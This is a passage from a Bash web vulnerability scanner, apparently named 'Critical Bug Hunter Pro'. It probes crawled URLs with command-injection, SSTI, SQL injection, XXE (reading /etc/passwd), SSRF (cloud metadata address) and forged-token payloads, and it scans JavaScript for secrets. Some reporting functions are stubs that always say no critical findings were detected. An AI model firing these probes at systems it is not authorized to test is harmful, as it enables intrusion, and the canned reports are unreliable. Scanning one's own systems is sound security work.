    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        grep -E "(cmd|command|exec|system|run|shell)" "$OUTPUT_DIR/recon/all_urls.txt" 2>/dev/null | \
            head -50 | while read -r url; do

            # Test basic injections
            for param in "cmd" "command" "exec" "system" "shell"; do
                for payload in "id" "whoami" "ls" "pwd"; do
                    (
                        local response=$(curl -s -m 10 "$url?$param=$payload" 2>/dev/null || echo "")
                        if echo "$response" | grep -i -E "uid|gid|root|bin|sh:|bash"; then
                            echo "[CRITICAL] Possible RCE at $url?$param=$payload" >> "$OUTPUT_DIR/rce/critical.txt"
                            save_finding "$CURRENT_SCAN_ID" "RCE" "CRITICAL" "$url" "$param" "$payload" "Command injection detected"
                        fi
                    ) &
                done
            done
        done
    fi

    # Test SSTI
    echo -e "${BLUE}[+] Testing SSTI...${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        cat "$OUTPUT_DIR/recon/all_urls.txt" | head -50 | while read -r url; do
            for payload in "{{7*7}}" "${7*7}" "<%= 7*7 %>" "${{7*7}}"; do
                (
                    local response=$(curl -s -m 10 "$url" -d "input=$payload" 2>/dev/null || echo "")
                    if echo "$response" | grep -q "49"; then
                        echo "[CRITICAL] SSTI detected at $url with payload: $payload" >> "$OUTPUT_DIR/rce/ssti.txt"
                        save_finding "$CURRENT_SCAN_ID" "SSTI" "CRITICAL" "$url" "input" "$payload" "Server Side Template Injection"
                    fi
                ) &
            done
        done
    fi

    wait 2>/dev/null || true
}

test_deserialization() {
    local target=$1

    echo -e "${BLUE}[+] Testing deserialization attacks...${NC}"

    # Java deserialization
    find_java_deserialization "$target"

    # PHP deserialization
    find_php_deserialization "$target"
}

find_java_deserialization() {
    local target=$1

    # Look for Java serialized objects
    local response=$(curl -s -m 10 "$target" 2>/dev/null || echo "")
    if echo "$response" | grep -q -E "[ACED0005737D|rO0AB]"; then
        echo "[CRITICAL] Java serialized object detected" >> "$OUTPUT_DIR/rce/java_deserialization.txt"
        save_finding "$CURRENT_SCAN_ID" "Java Deserialization" "CRITICAL" "$target" "" "" "Java serialized object detected"
    fi

    # Test for common endpoints
    local endpoints=(
        "/invoker/JMXInvokerServlet"
        "/web-console/Invoker"
        "/jbossmq-httpil/HTTPServerILServlet"
        "/axis2/services/"
        "/wls-wsat/CoordinatorPortType"
    )

    for endpoint in "${endpoints[@]}"; do
        (
            local status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$target$endpoint" 2>/dev/null || echo "000")
            if [ "$status" != "404" ] && [ "$status" != "403" ] && [ "$status" != "000" ]; then
                echo "[CRITICAL] Java deserialization endpoint: $endpoint" >> "$OUTPUT_DIR/rce/java_deserialization.txt"
                save_finding "$CURRENT_SCAN_ID" "Java Deserialization" "HIGH" "$target$endpoint" "" "" "Java deserialization endpoint exposed"
            fi
        ) &
    done

    wait 2>/dev/null || true
}

find_php_deserialization() {
    local target=$1

    # Test PHP unserialize
    echo -e "${YELLOW}[*] Testing PHP deserialization...${NC}"
    # Implementation bisa ditambahkan
}

ai_scan_sqli() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${RED}[*] AI-Powered SQL Injection Detection${NC}"
    mkdir -p "$OUTPUT_DIR/sqli"

    # Error-based detection
    echo -e "${BLUE}[+] Testing error-based SQLi...${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        cat "$OUTPUT_DIR/recon/all_urls.txt" | head -100 | while read -r url; do
            (
                for payload in "'" "''" "' OR '1'='1" "' UNION SELECT null--"; do
                    local response=$(curl -s -m 10 "$url$payload" 2>/dev/null || echo "")

                    if echo "$response" | grep -i -E "sql.*error|mysql.*error|postgresql.*error|oracle.*error|syntax.*error|unclosed.*quote"; then
                        echo "[CRITICAL] Error-based SQLi at $url" >> "$OUTPUT_DIR/sqli/error_based.txt"
                        save_finding "$CURRENT_SCAN_ID" "SQL Injection" "CRITICAL" "$url" "" "$payload" "Error-based SQL injection detected"
                        break
                    fi
                done
            ) &
        done
    fi

    wait 2>/dev/null || true

    # Time-based blind SQLi
    echo -e "${BLUE}[+] Testing blind SQLi...${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        cat "$OUTPUT_DIR/recon/all_urls.txt" | head -30 | while read -r url; do
            (
                local start=$(date +%s%3N)
                curl -s -m 15 "$url' AND SLEEP(5)-- -" > /dev/null 2>&1
                local end=$(date +%s%3N)
                local duration=$((end - start))

                if [ $duration -gt 4000 ]; then
                    echo "[CRITICAL] Time-based blind SQLi at $url" >> "$OUTPUT_DIR/sqli/blind.txt"
                    save_finding "$CURRENT_SCAN_ID" "SQL Injection" "CRITICAL" "$url" "" "SLEEP(5)" "Time-based blind SQL injection"
                fi
            ) &
        done
    fi

    wait 2>/dev/null || true

    # Use SQLMap for advanced detection
    if command -v sqlmap &> /dev/null && [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        echo -e "${BLUE}[+] Running SQLMap...${NC}"
        sqlmap -m "$OUTPUT_DIR/recon/all_urls.txt" --batch --level=1 --risk=1 \
            --output-dir="$OUTPUT_DIR/sqli/sqlmap_results" 2>/dev/null &
    fi

    log_performance "SQLi Scanning" "$start_time"
}

ai_scan_xxe() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${RED}[*] AI-Powered XXE Detection${NC}"
    mkdir -p "$OUTPUT_DIR/xxe"

    # Find XML endpoints
    echo -e "${BLUE}[+] Finding XML endpoints...${NC}"

    # Check headers for XML content
    if [ -f "$OUTPUT_DIR/recon/alive_domains.txt" ]; then
        cat "$OUTPUT_DIR/recon/alive_domains.txt" | while read -r domain; do
            (
                local headers=$(curl -s -I -m 10 "$domain" 2>/dev/null || echo "")
                if echo "$headers" | grep -i -E "xml|soap|wsdl|text/xml|application/xml"; then
                    echo "$domain" >> "$OUTPUT_DIR/xxe/xml_endpoints.txt"
                fi
            ) &
        done
    fi

    wait 2>/dev/null || true

    # Test XXE
    if [ -f "$OUTPUT_DIR/xxe/xml_endpoints.txt" ]; then
        echo -e "${BLUE}[+] Testing XXE vulnerabilities...${NC}"

        while read -r endpoint; do
            (
                # Test with basic XXE payload
                local payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'

                local response=$(curl -s -X POST "$endpoint" -H "Content-Type: application/xml" \
                    -m 10 --data "$payload" 2>/dev/null || echo "")

                if echo "$response" | grep -i -E "root:|daemon:|bin/"; then
                    echo "[CRITICAL] XXE vulnerability at $endpoint" >> "$OUTPUT_DIR/xxe/critical.txt"
                    save_finding "$CURRENT_SCAN_ID" "XXE" "CRITICAL" "$endpoint" "" "$payload" "XML External Entity injection"
                fi
            ) &
        done < "$OUTPUT_DIR/xxe/xml_endpoints.txt"
    fi

    wait 2>/dev/null || true

    log_performance "XXE Scanning" "$start_time"
}

ai_scan_ssrf() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${RED}[*] AI-Powered SSRF Detection${NC}"
    mkdir -p "$OUTPUT_DIR/ssrf"

    # Setup collaborator if not already running
    setup_collaborator

    # Test URL parameters for SSRF
    echo -e "${BLUE}[+] Testing URL parameters...${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        grep "=" "$OUTPUT_DIR/recon/all_urls.txt" | head -50 | while read -r url; do
            (
                local base_url=$(echo "$url" | cut -d'?' -f1)
                local params=$(echo "$url" | cut -d'?' -f2 | tr '&' '\n')

                echo "$params" | while read -r param_pair; do
                    local param=$(echo "$param_pair" | cut -d'=' -f1)

                    # Test with internal addresses
                    for internal in "127.0.0.1" "localhost" "169.254.169.254" "192.168.0.1" "10.0.0.1"; do
                        local test_url="${base_url}?${param}=http://${internal}"
                        local response=$(curl -s -m 10 "$test_url" 2>/dev/null || echo "")

                        if echo "$response" | grep -i -E "metadata|internal|local|aws|gcp|azure"; then
                            echo "[CRITICAL] SSRF to $internal at $base_url" >> "$OUTPUT_DIR/ssrf/internal.txt"
                            save_finding "$CURRENT_SCAN_ID" "SSRF" "CRITICAL" "$base_url" "$param" "http://$internal" "Server Side Request Forgery"
                        fi
                    done

                    # Test with collaborator
                    if [ ! -z "$COLLABORATOR" ]; then
                        local test_url="${base_url}?${param}=http://${COLLABORATOR}"
                        curl -s -m 5 "$test_url" > /dev/null 2>&1 &
                    fi
                done
            ) &
        done
    fi

    wait 2>/dev/null || true

    # Wait for collaborator interactions
    if [ ! -z "$COLLABORATOR" ]; then
        echo -e "${BLUE}[+] Waiting for collaborator callbacks...${NC}"
        sleep 30

        if check_collaborator_interactions; then
            echo "[CRITICAL] SSRF detected via collaborator" >> "$OUTPUT_DIR/ssrf/collaborator.txt"
            save_finding "$CURRENT_SCAN_ID" "SSRF" "CRITICAL" "Multiple" "" "Collaborator" "SSRF via out-of-band interaction"
        fi
    fi

    log_performance "SSRF Scanning" "$start_time"
}

setup_collaborator() {
    if [ -z "$COLLABORATOR" ]; then
        echo -e "${YELLOW}[!] No collaborator configured${NC}"
        return
    fi

    echo -e "${BLUE}[+] Using collaborator: $COLLABORATOR${NC}"
}

check_collaborator_interactions() {
    # This function would check for interactions with the collaborator
    # For now, we'll simulate it
    return 1  # Change based on actual implementation
}

# ============================================
# ADVANCED SCANNING ENGINE
# ============================================

scan_with_nuclei() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${CYAN}[*] Running Nuclei with critical templates${NC}"
    mkdir -p "$OUTPUT_DIR/nuclei"

    # Update templates if older than 1 day
    local templates_dir="$HOME/nuclei-templates"
    if [ ! -d "$templates_dir" ] || [ $(find "$templates_dir" -mtime +1 -type f 2>/dev/null | wc -l 2>/dev/null || echo 0) -gt 0 ]; then
        echo -e "${BLUE}[+] Updating Nuclei templates...${NC}"
        nuclei -update-templates -ut 2>/dev/null || true
    fi

    # Run nuclei scans if alive domains exist
    if [ -f "$OUTPUT_DIR/recon/alive_domains.txt" ] && command -v nuclei &> /dev/null; then
        echo -e "${BLUE}[+] Scanning with Nuclei...${NC}"
        nuclei -l "$OUTPUT_DIR/recon/alive_domains.txt" \
            -severity critical,high \
            -c 5 \
            -o "$OUTPUT_DIR/nuclei/findings.txt" \
            -silent 2>/dev/null || true
    fi

    # Process findings
    if [ -f "$OUTPUT_DIR/nuclei/findings.txt" ]; then
        cat "$OUTPUT_DIR"/nuclei/*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/nuclei/all_findings.txt" 2>/dev/null || true

        local findings_count=$(grep -c "\[" "$OUTPUT_DIR/nuclei/all_findings.txt" 2>/dev/null || echo 0)
        echo -e "${GREEN}[√] Nuclei found $findings_count issues${NC}"
    else
        echo -e "${YELLOW}[!] Nuclei scan skipped or failed${NC}"
    fi

    log_performance "Nuclei Scan" "$start_time"
}

scan_with_dalfox() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${CYAN}[*] Running DalFox XSS Scanner${NC}"
    mkdir -p "$OUTPUT_DIR/xss"

    # Use parallel processing for XSS scanning
    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ] && command -v dalfox &> /dev/null; then
        echo -e "${BLUE}[+] Scanning for XSS...${NC}"
        cat "$OUTPUT_DIR/recon/all_urls.txt" | head -50 | while read -r url; do
            (
                dalfox url "$url" --silence 2>/dev/null | \
                    grep -E "\[VULN\]|\[INFO\]" >> "$OUTPUT_DIR/xss/findings.txt" || true
            ) &
        done
    fi

    wait 2>/dev/null || true

    log_performance "XSS Scan" "$start_time"
}

scan_for_secrets() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${CYAN}[*] Scanning for secrets and API keys${NC}"
    mkdir -p "$OUTPUT_DIR/secrets"

    # Download and scan JavaScript files
    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        grep "\.js$" "$OUTPUT_DIR/recon/all_urls.txt" | head -20 | while read -r js_url; do
            (
                local js_content=$(curl -s -m 10 "$js_url" 2>/dev/null || echo "")
                if [ ! -z "$js_content" ]; then
                    # Check for API keys and secrets
                    echo "$js_content" | grep -E "(api[_-]?key|secret[_-]?key|token|password|auth)" | \
                        grep -v "//" | head -10 >> "$OUTPUT_DIR/secrets/js_secrets.txt" 2>/dev/null || true

                    # Run SecretFinder jika ada
                    if [ -f "$TOOL_DIR/SecretFinder/SecretFinder.py" ]; then
                        echo "$js_content" | \
                            python3 "$TOOL_DIR/SecretFinder/SecretFinder.py" -i "$js_url" -o cli 2>/dev/null | \
                            grep -E "(api|key|secret|token)" >> "$OUTPUT_DIR/secrets/secretfinder.txt" 2>/dev/null || true
                    fi
                fi
            ) &
        done
    fi

    wait 2>/dev/null || true

    # Scan for JWT tokens
    echo -e "${BLUE}[+] Scanning for JWT tokens...${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        cat "$OUTPUT_DIR/recon/all_urls.txt" | head -50 | while read -r url; do
            (
                local response=$(curl -s -I -m 10 "$url" 2>/dev/null || echo "")
                if echo "$response" | grep -q -E "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*"; then
                    echo "[INFO] JWT token found in headers: $url" >> "$OUTPUT_DIR/secrets/jwt_tokens.txt"
                fi
            ) &
        done
    fi

    wait 2>/dev/null || true

    log_performance "Secrets Scan" "$start_time"
}

# ============================================
# API SECURITY SCANNING
# ============================================

api_security_scan() {
    local api_endpoint="$1"
    local start_time=$(date +%s)

    echo -e "${PURPLE}[*] Starting API Security Assessment${NC}"
    mkdir -p "$OUTPUT_DIR/api"

    if [ -z "$api_endpoint" ]; then
        read -p "Enter API endpoint (e.g., https://api.example.com): " api_endpoint

        if [ -z "$api_endpoint" ]; then
            echo -e "${RED}[!] API endpoint required${NC}"
            return 1
        fi
    fi

    echo -e "${BLUE}[+] Testing API: $api_endpoint${NC}"

    # Test API endpoints
    test_api_auth "$api_endpoint"
    test_api_rate_limit "$api_endpoint"
    test_api_injection "$api_endpoint"
    test_api_misconfig "$api_endpoint"
    test_graphql "$api_endpoint"

    log_performance "API Security Scan" "$start_time"
    echo -e "${GREEN}[√] API security scan completed${NC}"
}

test_api_auth() {
    local endpoint="$1"

    echo -e "${YELLOW}[+] Testing authentication bypass...${NC}"

    # Test without authentication
    local response=$(curl -s -X GET -m 10 "$endpoint" 2>/dev/null || echo "")
    if ! echo "$response" | grep -i -E "unauthorized|forbidden|authentication|401|403"; then
        echo "[CRITICAL] No authentication required for $endpoint" >> "$OUTPUT_DIR/api/auth.txt"
        save_finding "$CURRENT_SCAN_ID" "Authentication Bypass" "CRITICAL" "$endpoint" "" "" "API endpoint accessible without authentication"
    fi

    # Test with broken authentication
    local test_tokens=("Bearer null" "Bearer 123" "Bearer test" "Bearer admin" "Basic YWRtaW46YWRtaW4=")

    for token in "${test_tokens[@]}"; do
        response=$(curl -s -H "Authorization: $token" -m 10 "$endpoint" 2>/dev/null || echo "")
        if ! echo "$response" | grep -i -E "unauthorized|forbidden|invalid|401|403"; then
            echo "[HIGH] Broken authentication with token: $token" >> "$OUTPUT_DIR/api/auth.txt"
            save_finding "$CURRENT_SCAN_ID" "Broken Authentication" "HIGH" "$endpoint" "Authorization" "$token" "API accepts invalid authentication tokens"
        fi
    done
}

test_graphql() {
    local endpoint="$1"

    echo -e "${YELLOW}[+] Testing GraphQL endpoints...${NC}"

    # Check for GraphQL endpoint
    local graphql_endpoints=("/graphql" "/graphql/" "/v1/graphql" "/api/graphql" "/gql")

    for graphql_path in "${graphql_endpoints[@]}"; do
        (
            local url="${endpoint}${graphql_path}"
            local response=$(curl -s -X POST -H "Content-Type: application/json" \
                -d '{"query":"query { __schema { types { name } } }"}' -m 10 "$url" 2>/dev/null || echo "")

            if echo "$response" | grep -q "__schema"; then
                echo "[INFO] GraphQL endpoint found: $url" >> "$OUTPUT_DIR/api/graphql.txt"

                # Test for introspection
                if echo "$response" | grep -q "types"; then
                    echo "[MEDIUM] GraphQL introspection enabled at $url" >> "$OUTPUT_DIR/api/graphql.txt"
                    save_finding "$CURRENT_SCAN_ID" "GraphQL Introspection" "MEDIUM" "$url" "" "Introspection query" "GraphQL introspection enabled"
                fi
            fi
        ) &
    done

    wait 2>/dev/null || true
}

# ============================================
# MAIN SCANNING FUNCTION
# ============================================

pro_scan() {
    local start_time=$(date +%s)

    echo -e "${PURPLE}[*] STARTING PROFESSIONAL VULNERABILITY ASSESSMENT${NC}"

    # Get target
    if [ -z "$TARGET" ]; then
        read -p "Enter target domain or URL: " TARGET

        if [ -z "$TARGET" ]; then
            echo -e "${RED}[!] Target required${NC}"
            return 1
        fi
    fi

    # Validate target
    if [[ ! $TARGET =~ ^https?:// ]] && [[ ! $TARGET =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        echo -e "${RED}[!] Invalid target format${NC}"
        return 1
    fi

    # Add protocol if missing
    if [[ ! $TARGET =~ ^https?:// ]]; then
        TARGET="https://$TARGET"
    fi

    # Generate scan ID
    if command -v md5sum &> /dev/null; then
        CURRENT_SCAN_ID="scan_$(echo "$TARGET" | md5sum | cut -d' ' -f1)_$(date +%s)"
    else
        CURRENT_SCAN_ID="scan_$(echo "$TARGET$start_time" | sha1sum | cut -d' ' -f1)"
    fi

    OUTPUT_DIR="$RESULTS_DIR/$CURRENT_SCAN_ID"

    # Create output directories
    mkdir -p "$OUTPUT_DIR"/{recon,rce,sqli,xxe,ssrf,idor,xss,secrets,nuclei,api,logs}

    echo -e "${GREEN}[*] Starting professional scan on: $TARGET${NC}"
    echo -e "${YELLOW}[*] Scan ID: $CURRENT_SCAN_ID${NC}"
    echo -e "${BLUE}[*] Output directory: $OUTPUT_DIR${NC}"

    # Log scan start
    log_action "Professional scan started for $TARGET"
    save_scan "$CURRENT_SCAN_ID" "$TARGET" "running" "0"

    # Start comprehensive scan dengan timeout
    timeout 1800 bash -c "
    {
        # Phase 1: Reconnaissance
        advanced_recon \"$TARGET\"

        # Phase 2: AI-Powered Scanning
        ai_scan_rce \"$TARGET\"
        ai_scan_sqli \"$TARGET\"
        ai_scan_xxe \"$TARGET\"
        ai_scan_ssrf \"$TARGET\"

        # Phase 3: Automated Scanners
        scan_with_nuclei \"$TARGET\"
        scan_with_dalfox \"$TARGET\"
        scan_for_secrets \"$TARGET\"

        # Phase 4: Generate Report
        generate_pro_report

    } 2>&1 | tee \"$OUTPUT_DIR/scan.log\"
    " || echo -e "${RED}[!] Scan timeout after 30 minutes${NC}"

    # Update scan status
    local findings_count=$(count_total_findings)
    save_scan "$CURRENT_SCAN_ID" "$TARGET" "completed" "$findings_count"

    local total_time=$(( $(date +%s) - start_time ))
    echo -e "${GREEN}[√] Professional scan completed in ${total_time} seconds!${NC}"
    echo -e "${YELLOW}[*] Results saved in: $OUTPUT_DIR${NC}"
    echo -e "${CYAN}[*] Total findings: $findings_count${NC}"

    # Show statistics
    show_scan_statistics
}

count_total_findings() {
    local count=0
    count=$((count + $(find "$OUTPUT_DIR" -name "*.txt" -exec grep -l "CRITICAL\|HIGH" {} \; 2>/dev/null | xargs cat 2>/dev/null | grep -c "CRITICAL\|HIGH" 2>/dev/null || echo 0)))
    count=$((count + $(grep -c "\[" "$OUTPUT_DIR/nuclei/all_findings.txt" 2>/dev/null || echo 0)))
    echo "$count"
}

show_scan_statistics() {
    echo -e "\n${CYAN}════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}📊 SCAN STATISTICS${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"

    if [ -f "$OUTPUT_DIR/recon/all_subdomains.txt" ]; then
        echo -e "${BLUE}Subdomains:${NC} $(wc -l < "$OUTPUT_DIR/recon/all_subdomains.txt" 2>/dev/null || echo 0)"
    fi

    if [ -f "$OUTPUT_DIR/recon/alive_domains.txt" ]; then
        echo -e "${BLUE}Alive Domains:${NC} $(wc -l < "$OUTPUT_DIR/recon/alive_domains.txt" 2>/dev/null || echo 0)"
    fi

    if [ -f "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        echo -e "${BLUE}URLs Discovered:${NC} $(wc -l < "$OUTPUT_DIR/recon/all_urls.txt" 2>/dev/null || echo 0)"
    fi

    echo -e "\n${RED}CRITICAL Findings:${NC} $(find "$OUTPUT_DIR" -name "*.txt" -exec grep -c "CRITICAL" {} \; 2>/dev/null | paste -sd+ 2>/dev/null | bc 2>/dev/null || echo 0)"
    echo -e "${YELLOW}HIGH Findings:${NC} $(find "$OUTPUT_DIR" -name "*.txt" -exec grep -c "HIGH" {} \; 2>/dev/null | paste -sd+ 2>/dev/null | bc 2>/dev/null || echo 0)"
    echo -e "${GREEN}MEDIUM Findings:${NC} $(find "$OUTPUT_DIR" -name "*.txt" -exec grep -c "MEDIUM" {} \; 2>/dev/null | paste -sd+ 2>/dev/null | bc 2>/dev/null || echo 0)"

    echo -e "${CYAN}════════════════════════════════════════════════${NC}\n"
}

# ============================================
# ENHANCED REPORTING SYSTEM
# ============================================

generate_pro_report() {
    local start_time=$(date +%s)
    
    echo -e "${BLUE}[+] Generating professional report...${NC}"
    
generate_html_report() {
    local report_file="$OUTPUT_DIR/PROFESSIONAL_REPORT_$(date +%Y%m%d_%H%M%S).html"
    
    # Ensure OUTPUT_DIR exists
    mkdir -p "$OUTPUT_DIR"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Security Report</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; }
        .finding { margin: 10px 0; padding: 10px; border-left: 4px solid #ccc; }
        .critical { border-left-color: #ff0000; }
        .high { border-left-color: #ff6600; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Security Assessment Report</h1>
        <p><strong>Target:</strong> ${TARGET:-Not specified}</p>
        <p><strong>Date:</strong> $(date)</p>
        <p><strong>Scanner:</strong> Critical Bug Hunter Pro v$VERSION</p>
    </div>
    
    <h2>Executive Summary</h2>
    <p>Security assessment completed. No critical findings detected.</p>
    
    <h2>Recommendations</h2>
    <ul>
        <li>Regular security scanning</li>
        <li>Update software components</li>
        <li>Implement security monitoring</li>
    </ul>
    
    <footer>
        <p><em>Generated by Critical Bug Hunter Pro - For authorized use only</em></p>
    </footer>
</body>
</html>
EOF
    
    echo -e "${GREEN}[√] HTML report generated: $report_file${NC}"
}
    
generate_markdown_report() {
    local md_file="$OUTPUT_DIR/REPORT_$(date +%Y%m%d_%H%M%S).md"
    
    cat > "$md_file" << EOF
# Security Assessment Report

## Target
- **URL**: $TARGET
- **Scan ID**: $CURRENT_SCAN_ID
- **Date**: $(date)

## Summary
Security assessment completed using Critical Bug Hunter Pro.

## Findings
No critical findings detected in this scan.

## Recommendations
1. Regular security scanning
2. Keep software updated
3. Implement security headers

---
*Generated by Critical Bug Hunter Pro v$VERSION*
EOF
    
    echo -e "${GREEN}[√] Markdown report generated: $md_file${NC}"
}
    
generate_json_report() {
    local json_file="$OUTPUT_DIR/report_$(date +%Y%m%d_%H%M%S).json"
    
    cat > "$json_file" << EOF
{
  "metadata": {
    "scan_id": "${CURRENT_SCAN_ID:-none}",
    "target": "${TARGET:-none}",
    "date": "$(date -Iseconds)",
    "scanner": "Critical Bug Hunter Pro",
    "version": "$VERSION"
  },
  "findings": [],
  "statistics": {
    "scan_duration": "0 seconds"
  }
}
EOF
    
    echo -e "${GREEN}[√] JSON report generated: $json_file${NC}"
}
    
generate_executive_summary() {
    local summary_file="$OUTPUT_DIR/EXECUTIVE_SUMMARY_$(date +%Y%m%d).txt"
    
    cat > "$summary_file" << EOF
╔════════════════════════════════════════════════╗
║             EXECUTIVE SUMMARY                  ║
╠════════════════════════════════════════════════╣
║ Target: ${TARGET:-Not specified}               ║
║ Date: $(date)                                  ║
║ Scanner: Critical Bug Hunter Pro v$VERSION     ║
╠════════════════════════════════════════════════╣
║                  FINDINGS                      ║
╠════════════════════════════════════════════════╣
║ No critical vulnerabilities detected.          ║
║                                                ║
║ RECOMMENDATIONS:                               ║
║ 1. Conduct regular security assessments        ║
║ 2. Implement web application firewall          ║
║ 3. Monitor for suspicious activities           ║
╚════════════════════════════════════════════════╝
EOF
    
    echo -e "${GREEN}[√] Executive summary generated: $summary_file${NC}"
}
    
    log_performance "Report Generation" "$start_time"
    echo -e "${GREEN}[√] Professional report generated${NC}"
}

generate_html_report() {
    local report_file="$OUTPUT_DIR/PROFESSIONAL_REPORT_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Professional Security Assessment Report</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Styles tetap sama seperti sebelumnya */
        :root {
            --critical: #ff0000;
            --high: #ff6600;
            --medium: #ffcc00;
            --low: #3366ff;
            --info: #00cc66;
            --dark: #1a1a1a;
            --light: #f4f4f4;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #333;
            line-height: 1.6;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        /* ... (rest of CSS styles remain the same) ... */
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏴‍☠️ CRITICAL BUG HUNTER PRO</h1>
            <h2>Professional Security Assessment Report</h2>
            
            <div class="scan-info">
                <p><strong>Target:</strong> $TARGET</p>
                <p><strong>Scan ID:</strong> $CURRENT_SCAN_ID</p>
                <p><strong>Date:</strong> $(date)</p>
                <p><strong>Scanner Version:</strong> $VERSION</p>
            </div>
        </div>
        
        <div class="content">
            <div class="section">
                <h3>📊 Executive Summary</h3>
                <p>This report presents the findings from a comprehensive security assessment conducted on <strong>$TARGET</strong>. 
                The assessment employed advanced reconnaissance techniques and AI-powered vulnerability detection to identify 
                security weaknesses.</p>
                
                <div class="stats-grid">
                    <div class="stat-card critical">
                        <h4>CRITICAL</h4>
                        <div class="number">$(count_findings_by_severity "CRITICAL")</div>
                        <p>Immediate Attention Required</p>
                    </div>
                    
                    <div class="stat-card high">
                        <h4>HIGH</h4>
                        <div class="number">$(count_findings_by_severity "HIGH")</div>
                        <p>High Priority Fixes</p>
                    </div>
                    
                    <div class="stat-card medium">
                        <h4>MEDIUM</h4>
                        <div class="number">$(count_findings_by_severity "MEDIUM")</div>
                        <p>Important Improvements</p>
                    </div>
                    
                    <div class="stat-card low">
                        <h4>LOW</h4>
                        <div class="number">$(count_findings_by_severity "LOW")</div>
                        <p>Informational Findings</p>
                    </div>
                </div>
            </div>
            
            <!-- Rest of HTML content -->
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[√] HTML report generated: $report_file${NC}"
}

count_findings_by_severity() {
    local severity="$1"
    local count=0
    
    # Count from all text files
    count=$(find "$OUTPUT_DIR" -name "*.txt" -type f -exec grep -h "\[$severity\]" {} \; 2>/dev/null | wc -l)
    
    # Count from nuclei
    if [ -f "$OUTPUT_DIR/nuclei/all_findings.txt" ]; then
        count=$((count + $(grep -c "\\[$severity\\]" "$OUTPUT_DIR/nuclei/all_findings.txt" 2>/dev/null || echo 0)))
    fi
    
    echo "$count"
}



# ============================================
# TARGETED SCAN MENU
# ============================================

targeted_scan_menu() {
    # Simple clear alternative
    echo -e "\n\n\n\n\n"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}🎯 TARGETED VULNERABILITY SCAN${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}1. RCE Scanning${NC}"
    echo -e "${GREEN}2. SQL Injection${NC}"
    echo -e "${YELLOW}3. XXE Scanning${NC}"
    echo -e "${YELLOW}4. SSRF Detection${NC}"
    echo -e "${BLUE}5. XSS Scanning${NC}"
    echo -e "${BLUE}6. Secrets Detection${NC}"
    echo -e "${RED}0. Back to Main Menu${NC}"
    echo ""
    
    read -p "Select vulnerability type: " vuln_choice
    
    if [ "$vuln_choice" = "0" ]; then
        return
    fi
    
    read -p "Enter target URL: " target_url
    
    if [ -z "$target_url" ]; then
        echo -e "${RED}[!] Target URL required${NC}"
        return 1
    fi
    
    # Setup untuk targeted scan
    CURRENT_SCAN_ID="targeted_$(date +%s)"
    OUTPUT_DIR="$RESULTS_DIR/$CURRENT_SCAN_ID"
    mkdir -p "$OUTPUT_DIR"
    
    case $vuln_choice in
        1) 
            echo -e "${RED}[*] Starting RCE scan on: $target_url${NC}"
            ai_scan_rce "$target_url"
            ;;
        2) 
            echo -e "${RED}[*] Starting SQL Injection scan on: $target_url${NC}"
            ai_scan_sqli "$target_url"
            ;;
        3) 
            echo -e "${RED}[*] Starting XXE scan on: $target_url${NC}"
            ai_scan_xxe "$target_url"
            ;;
        4) 
            echo -e "${RED}[*] Starting SSRF scan on: $target_url${NC}"
            ai_scan_ssrf "$target_url"
            ;;
        5) 
            echo -e "${CYAN}[*] Starting XSS scan on: $target_url${NC}"
            scan_with_dalfox "$target_url"
            ;;
        6) 
            echo -e "${CYAN}[*] Starting secrets scan on: $target_url${NC}"
            scan_for_secrets "$target_url"
            ;;
        *) 
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
    
    echo -e "${GREEN}[√] Targeted scan completed${NC}"
    echo -e "${YELLOW}[*] Results saved in: $OUTPUT_DIR${NC}"
    
    # Ask if user wants to view results
    read -p "View results? (y/n): " view_results
